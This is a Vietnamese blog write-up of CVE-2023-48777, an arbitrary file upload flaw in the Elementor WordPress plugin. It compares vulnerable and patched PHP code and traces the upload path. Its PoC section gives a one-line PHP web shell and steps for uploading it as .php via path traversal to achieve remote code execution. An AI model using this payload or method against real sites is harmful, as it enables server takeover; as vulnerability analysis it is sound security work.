---
title: CVE-2023-48777 Analysis & POC
description: Security Vulnerability in WordPress Elementor Website Builder Plugin.
date: 2025-11-10 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, arbitrary file upload]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Arbitrary File Upload** trong **Elementor Website Builder** plugin cho WordPress. Vấn đề này ảnh hưởng đến **Elementor Website Builder**: từ phiên bản **3.3.0** đến **3.18.1**.

* **CVE ID**: [CVE-2023-48777](https://www.cve.org/CVERecord?id=CVE-2023-48777)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 3.3.0-3.18.1
* **Patched Versions**: 3.18.2
* **CVSS severity**: High (9.9)
* **Required Privilege**: Contributor
* **Product**: [WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin](https://wordpress.org/plugins/elementor/)

## Requirements

* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Elementor Website Builder Plugin 3.3.0-3.18.1**:  
    * `3.3.0` – **vulnerable**  
    * `3.18.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Lỗ hổng xuất phát từ việc **không kiểm tra loại file (file type)** hợp lệ trước khi lưu trữ lên **server**, cho phép kẻ tấn công tải lên các file có định dạng nguy hiểm.

Trong phiên bản **3.18.1**, hàm `handle_elementor_upload()` không thực hiện xác minh `file type` khi xử lý dữ liệu tải lên từ tham số `fileData`:

```php {title="uploads-manager.php - v3.18.1" hl_lines=[3] data-open=true}
public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {
    if ( isset( $file['fileData'] ) ) {
        $file = $this->save_base64_to_tmp_file( $file );
    }

    $validation_result = $this->validate_file( $file, $allowed_file_extensions );

    if ( is_wp_error( $validation_result ) ) {
        return $validation_result;
    }

    return $file;
}
```

```php {title="uploads-manager.php - v3.18.1" hl_lines=[9] data-open=true}
private function save_base64_to_tmp_file( $file ) {
    $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore

    // If the decode fails
    if ( ! $file_content ) {
        return new \WP_Error( 'file_error', self::INVALID_FILE_CONTENT );
    }

    $temp_filename = $this->create_temp_file( $file_content, $file['fileName'] );

    if ( is_wp_error( $temp_filename ) ) {
        return $temp_filename;
    }

    return [
        // the original uploaded file name
        'name' => $file['fileName'],
        // The path to the temporary file
        'tmp_name' => $temp_filename,
    ];
}
```

Trong bản vá **3.18.2**, nhà phát triển đã **bổ sung kiểm tra loại file hợp lệ** trước khi lưu trữ bằng cách truyền thêm tham số `$allowed_file_extensions` vào hàm `save_base64_to_tmp_file()`, nhằm ngăn chặn việc tải lên các file độc hại:

```php {title="uploads-manager.php - v3.18.2" hl_lines=[3] data-open=true}
public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {
    if ( isset( $file['fileData'] ) ) {
        $file = $this->save_base64_to_tmp_file( $file, $allowed_file_extensions );
    }

    $validation_result = $this->validate_file( $file, $allowed_file_extensions );

    if ( is_wp_error( $validation_result ) ) {
        return $validation_result;
    }

    return $file;
}
```

```php {title="uploads-manager.php - v3.18.2" hl_lines=[2,3,5,6,7,16] data-open=true}
private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) {
    $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION );
    $is_file_type_allowed = $this->is_file_type_allowed( $file_extension, $allowed_file_extensions );

    if ( is_wp_error( $is_file_type_allowed ) ) {
        return $is_file_type_allowed;
    }

    $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore

    // If the decode fails
    if ( ! $file_content ) {
        return new \WP_Error( 'file_error', self::INVALID_FILE_CONTENT );
    }

    $temp_filename = $this->create_temp_file( $file_content, $file['fileName'] );

    if ( is_wp_error( $temp_filename ) ) {
        return $temp_filename;
    }

    return [
        // the original uploaded file name
        'name' => $file['fileName'],
        // The path to the temporary file
        'tmp_name' => $temp_filename,
    ];
}
```

## Code Analysis
Quá trình upload **template** có nội dung ở dạng **Base64** được xử lý như sau: dữ liệu trong `$file['fileData']` được **giải mã bằng** `base64_decode` và gán vào biến `$file_content`:

```php
$file_content = base64_decode( $file['fileData'] );
```

Sau khi giải mã, hàm `save_base64_to_tmp_file()` sẽ **gọi đến** `create_temp_file()` để **lưu nội dung này thành file template** trên server:

```php {title="uploads-manager.php - v3.18.1" hl_lines=[] data-open=true}
public function create_temp_file( $file_content, $file_name ) {
    $temp_filename = $this->create_unique_dir() . $file_name;

    file_put_contents( $temp_filename, $file_content ); // phpcs:ignore

    return $temp_filename;
}
```

Đường dẫn lưu file được tạo bằng cách nối `$file_name` với kết quả trả về từ `create_unique_dir()` - hàm này tạo đường dẫn lưu trữ **template tạm thời**:

```php {title="uploads-manager.php - v3.18.1" hl_lines=[] data-open=true}
public function create_unique_dir() {
    $unique_dir_path = $this->get_temp_dir() . uniqid() . DIRECTORY_SEPARATOR;

    wp_mkdir_p( $unique_dir_path );

    return $unique_dir_path;
}
```

Hàm `create_unique_dir()` chịu trách nhiệm **tạo thư mục chứa template tạm thời**, có dạng:

```
wp-content/uploads/elementor/tmp/<filename>
```

Trong đó, `<uniqueId>` được sinh tự động bằng [uniqid()](https://www.php.net/manual/en/function.uniqid.php) để đảm bảo đường dẫn không trùng lặp. `wp_mkdir_p()` sẽ tạo thư mục vật lý trên server để lưu trữ template này.

Cuối cùng `create_temp_file()` sẽ gọi đến `file_put_contents( $temp_filename, $file_content )` để lưu trữ nội dung của `$file_content` vào `$temp_filename`

> [!BUG]
> Tận dùng việc không sanitize file name ở đây, ta kết hợp tấn công path travesal để file được lưu ở vị trí có thể truy cập được, vượt qua được tính chất ngẫu nhiên của `uniqid()`

---

```php {title="manager.php - v3.18.1" hl_lines=[2,3,7] data-open=true}
public function import_template( array $data ) {
    // If the template is a JSON file, allow uploading it.
    add_filter( 'elementor/files/allow-file-type/json', [ $this, 'enable_json_template_upload' ] );
    add_filter( 'elementor/files/allow_unfiltered_upload', [ $this, 'enable_json_template_upload' ] );

    // Imported templates can be either JSON files, or Zip files containing multiple JSON files
    $upload_result = Plugin::$instance->uploads_manager->handle_elementor_upload( $data, [ 'zip', 'json' ] );
    ...
}
```

`handle_elementor_upload()` được gọi trong `import_template()`. Theo như comment của developer thì nếu template là JSON file thì được phép upload, ta đặt debug và thực hiện upload JSON template:
1. Tạo post bằng Elementor
2. Click vào folder icon

![Folder icon](folder_icon.png "Vị trí folder icon")

3. Click vào upload icon

![Upload icon](upload_icon.png "Vị trí upload icon")

![Upload board](upload_board.png "Giao diện upload")

4. Chọn JSON file và upload

![Debug](debug.gif "Debuger nhảy tới import_template sau khi upload JSON file")

## Flow

{{< mermaid >}}
graph TD
A["User uploads JSON file"] --> B["import_template()"]
B --> C["handle_elementor_upload()"]
C --> D["save_base64_to_tmp_file()"]
D --> E["create_temp_file()"]
E --> G["create_unique_dir()"]
G --> H["file_put_contents()"]
H --> I["File stored without proper type validation → Arbitrary File Upload"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo JSON file chứa web shell 
PHP
```php
<?php system($_REQUEST["cmd"])?>
```

2. Upload và bắt request bằng BurpSuite
3. Sửa đổi file extension thành PHP kết hợp path traversal và gửi request

![Request](request.png "Request với path traversal và .php")

**Kết quả**
![Result](result.png "RCE với file upload")

## Conclusion

Lỗ hổng **CVE-2023-48777** cho phép người dùng có quyền **Contributor** tải lên các file độc hại do thiếu kiểm tra loại file trước khi lưu trữ. Điều này có thể dẫn đến **Arbitrary File Upload** và **Remote Code Execution (RCE)** nếu máy chủ cho phép thực thi file upload. Lỗi đã được vá trong phiên bản **3.18.2** bằng cách bổ sung kiểm tra phần mở rộng file hợp lệ trước khi ghi ra đĩa.

## Key Takeaway

* Luôn **xác thực loại file trước khi lưu**.
* **Không tin tưởng dữ liệu Base64 hoặc tên file** từ client.
* **Giới hạn quyền upload** và tách biệt thư mục lưu file khỏi vùng thực thi mã.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin <= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/elementor/vulnerability/wordpress-elementor-plugin-3-18-0-arbitrary-file-upload-vulnerability)  